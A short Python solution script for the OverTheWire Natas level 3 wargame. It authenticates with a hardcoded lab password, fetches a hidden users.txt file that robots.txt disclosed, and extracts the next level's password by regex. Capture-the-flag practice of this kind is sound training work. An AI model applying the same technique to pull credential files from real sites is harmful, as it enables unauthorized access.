#!/usr/bin/env python
# import the package requests which is for html information
import requests
import re

username = 'natas3'
password = 'G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q'

# url = 'http://%s.natas.labs.overthewire.org/robots.txt' % username
# file showed us /s3cr3t folder

url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % username
# s3cr3t showed us a hidden user.txt file


response = requests.get(url,auth = (username, password))
content = response.text

# print(content)
# (.*)

print(re.findall("natas4:(.*)", content)[0])